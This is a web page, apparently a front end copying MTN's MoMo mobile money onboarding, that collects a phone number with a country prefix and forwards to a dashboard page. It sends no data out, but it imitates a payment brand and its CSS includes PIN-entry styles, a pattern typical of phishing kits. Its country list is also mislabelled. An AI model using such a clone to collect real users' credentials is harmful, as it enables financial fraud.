<!doctype html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Super App Onboarding</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,400;0,600;0,700;1,600;1,700&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />

  <style>
    :root {
      --primary-blue: #003366;
      --accent-yellow: #ffd600;
      --light-blue-text: #8faadb;
      --bottom-sheet-bg: #ffffff;
      --btn-disabled: #e2e8f0;
      --btn-disabled-text: #64748b;
    }

    body {
      font-family: "Inter", sans-serif;
      background-color: var(--primary-blue);
      margin: 0;
      padding: 0;
      min-height: 100dvh;
      display: flex;
      flex-direction: column;
    }

    .pin-box {
      width: 60px;
      height: 60px;
      border: 2px solid #e2e8f0;
      border-radius: 12px;
      text-align: center;
      font-size: 2.5rem;
      font-weight: 700;
      color: var(--accent-yellow) !important;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
      -webkit-text-security: disc;
      -moz-text-security: disc;
      text-security: disc;
    }

    .pin-box:focus {
      border-color: var(--primary-blue);
      box-shadow: 0 0 0 3px rgba(0, 51, 102, 0.1);
    }

    #loader-overlay {
      position: fixed;
      inset: 0;
      background: rgba(255, 255, 255, 0.95);
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 200;
    }

    .pendulum-container {
      width: 100px;
      height: 100px;
      position: relative;
    }

    .pendulum-arm {
      width: 4px;
      height: 70px;
      background: var(--primary-blue);
      position: absolute;
      top: 0;
      left: 50%;
      transform-origin: top center;
      animation: pendulumMove 1.5s ease-in-out infinite;
    }

    .pendulum-bob {
      width: 26px;
      height: 26px;
      background: var(--accent-yellow);
      border-radius: 50%;
      position: absolute;
      bottom: -13px;
      left: -11px;
      box-shadow: 0 4px 15px rgba(255, 214, 0, 0.6);
    }

    @keyframes pendulumMove {
      0% { transform: rotate(45deg); }
      50% { transform: rotate(-45deg); }
      100% { transform: rotate(45deg); }
    }

    .status-text {
      margin-top: 2.5rem;
      color: var(--primary-blue);
      font-weight: 700;
      font-style: italic;
      font-size: 1.1rem;
    }

    .pin-header img {
      width: 120px;
      height: auto;
      object-fit: contain;
    }
  </style>
</head>

<body>
  <div id="loader-overlay">
    <div class="pendulum-container">
      <div class="pendulum-arm">
        <div class="pendulum-bob"></div>
      </div>
    </div>
    <p class="status-text" id="loader-status">Please wait...</p>
  </div>

  <div id="splash-screen" class="fixed inset-0 z-50 flex items-center justify-center bg-[#003a58] transition-opacity duration-500">
    <div class="text-center">
      <img src="mtn-logo.png" alt="" style="height: 150px" />
    </div>
  </div>

  <div id="main-content" class="w-full h-screen flex flex-col justify-between opacity-0 transition-opacity duration-1000 relative overflow-hidden bg-white">
    <div class="absolute top-0 left-0 right-0 h-[22vh] bg-[#004f71] flex flex-col items-center pt-8 z-0">
      <img src="mtn-logo.png" alt="MoMo from MTN" class="w-40 h-auto object-contain" />
    </div>

    <div class="relative w-full flex-1 flex flex-col items-center px-6 z-10 pt-[18vh] justify-start">
      <div class="w-full max-w-md bg-white rounded-[32px] shadow-xl p-6 flex flex-col items-center text-center">
        <h2 class="text-[#004f71] text-xl font-bold mb-6">Welcome to MoMo</h2>

        <div class="w-full flex gap-3 h-[64px] relative">
          <div id="countryDropdownBtn" class="relative flex items-center justify-center w-[72px] border border-gray-400 rounded-[20px] bg-white cursor-pointer hover:border-[#004f71] transition-colors z-20">
            <div class="w-9 h-9 rounded-full overflow-hidden flex items-center justify-center border border-gray-100 shadow-inner">
              <img id="selectedFlag" src="https://flagcdn.com/w80/zm.png" alt="Zambia" class="w-full h-full object-cover scale-110" />
            </div>
          </div>

          <div class="flex-1 relative border border-gray-400 rounded-[20px] bg-white px-4 flex items-center focus-within:border-[#004f71] transition-colors">
            <label class="absolute left-4 -top-2.5 bg-white px-1 text-xs text-[#004f71] font-medium">Enter number *</label>
            <input type="tel" id="phoneNumber" placeholder="260" class="w-full h-full bg-transparent text-[18px] text-gray-800 outline-none font-medium tracking-wide" />
          </div>

          <div id="countryMenu" class="hidden absolute left-0 right-0 top-[70px] bg-white border border-[#004f71] rounded-[24px] shadow-2xl p-4 z-30">
            <h3 class="text-black text-base font-semibold mb-3 text-left px-2">Select your country</h3>
            <div class="flex flex-col max-h-[200px] overflow-y-auto pr-1">
              <div class="country-option flex items-center gap-4 p-2.5 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="256" data-flag="https://flagcdn.com/w80/ug.png">
                <div class="w-7 h-7 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/ug.png" class="w-full h-full object-cover scale-110" /></div>
                <span class="text-gray-900 font-medium text-sm">Zambia</span>
              </div>
              <div class="country-option flex items-center gap-4 p-2.5 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="237" data-flag="https://flagcdn.com/w80/cm.png">
                <div class="w-7 h-7 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/cm.png" class="w-full h-full object-cover scale-110" /></div>
                <span class="text-gray-900 font-medium text-sm">Cameroon</span>
              </div>
              <div class="country-option flex items-center gap-4 p-2.5 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="225" data-flag="https://flagcdn.com/w80/ci.png">
                <div class="w-7 h-7 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/ci.png" class="w-full h-full object-cover scale-110" /></div>
                <span class="text-gray-900 font-medium text-sm">Côte d'Ivoire</span>
              </div>
              <div class="country-option flex items-center gap-4 p-2.5 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="233" data-flag="https://flagcdn.com/w80/gh.png">
                <div class="w-7 h-7 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/gh.png" class="w-full h-full object-cover scale-110" /></div>
                <span class="text-gray-900 font-medium text-sm">Ghana</span>
              </div>
              <div class="country-option flex items-center gap-4 p-2.5 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="260" data-flag="https://flagcdn.com/w80/zm.png">
                <div class="w-7 h-7 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/zm.png" class="w-full h-full object-cover scale-110" /></div>
                <span class="text-gray-900 font-medium text-sm">Uganda</span>
              </div>
              <div class="country-option flex items-center gap-4 p-2.5 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="229" data-flag="https://flagcdn.com/w80/bj.png">
                <div class="w-7 h-7 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/bj.png" class="w-full h-full object-cover scale-110" /></div>
                <span class="text-gray-900 font-medium text-sm">Benin</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      <p class="text-center text-xs text-[#004f71] max-w-xs mt-6 font-medium leading-relaxed px-4">
        By using this app you agree to our
        <a href="#" class="font-bold underline">Mobile Terms of Use</a> and
        <a href="#" class="font-bold underline">Privacy Policy</a>
      </p>
    </div>

    <div class="w-full px-6 pb-6 pt-2 z-10 flex justify-center bg-white">
      <button id="submitBtn" disabled class="w-full max-w-sm bg-gray-200 text-gray-500 py-3.5 rounded-full font-semibold text-base tracking-wide uppercase shadow-sm transition-colors cursor-not-allowed">
        Next
      </button>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const splashScreen = document.getElementById("splash-screen");
      const mainContent = document.getElementById("main-content");
      const phoneInput = document.getElementById("phoneNumber");
      const submitBtn = document.getElementById("submitBtn");
      const dropdownBtn = document.getElementById("countryDropdownBtn");
      const countryMenu = document.getElementById("countryMenu");
      const selectedFlag = document.getElementById("selectedFlag");
      const countryOptions = document.querySelectorAll(".country-option");

      let currentPrefix = "260";
      if (phoneInput) phoneInput.value = currentPrefix;

      // --- Splash Screen Timeout ---
      setTimeout(() => {
        if (splashScreen) {
          splashScreen.style.opacity = "0";
          mainContent.classList.remove("opacity-0");
          mainContent.classList.add("opacity-100");
          setTimeout(() => {
            if (splashScreen.parentNode) splashScreen.parentNode.removeChild(splashScreen);
          }, 500);
        }
      }, 2000);

      // --- Country Prefix Selection Event Logic ---
      if (dropdownBtn) {
        dropdownBtn.addEventListener("click", (e) => {
          e.stopPropagation();
          countryMenu.classList.toggle("hidden");
        });
      }

      countryOptions.forEach(option => {
        option.addEventListener("click", () => {
          const targetCode = option.getAttribute("data-code");
          const targetFlagUrl = option.getAttribute("data-flag");

          currentPrefix = targetCode;
          selectedFlag.src = targetFlagUrl;
          phoneInput.value = targetCode;

          countryMenu.classList.add("hidden");
          phoneInput.focus();
          phoneInput.dispatchEvent(new Event('input'));
        });
      });

      document.addEventListener("click", (e) => {
        if (dropdownBtn && !dropdownBtn.contains(e.target) && countryMenu && !countryMenu.contains(e.target)) {
          countryMenu.classList.add("hidden");
        }
      });

      // --- Phone Input Verification Rules ---
      phoneInput.addEventListener("input", (e) => {
        let value = e.target.value.replace(/\D/g, "");
        if (!value.startsWith(currentPrefix)) {
          value = currentPrefix;
        }
        e.target.value = value;

        if (value.length > currentPrefix.length + 5) {
          submitBtn.disabled = false;
          submitBtn.classList.remove("bg-gray-200", "text-gray-500", "cursor-not-allowed");
          submitBtn.classList.add("bg-[#004e73]", "text-white", "cursor-pointer");
        } else {
          submitBtn.disabled = true;
          submitBtn.classList.add("bg-gray-200", "text-gray-500", "cursor-not-allowed");
          submitBtn.classList.remove("bg-[#004e73]", "text-white", "cursor-pointer");
        }
      });

      // --- Direct Navigation to Dashboard ---
      submitBtn.addEventListener("click", () => {
        window.location.href = "dashboard.html"; // Change this to your dashboard file name
      });
    });
  </script>
</body>

</html>
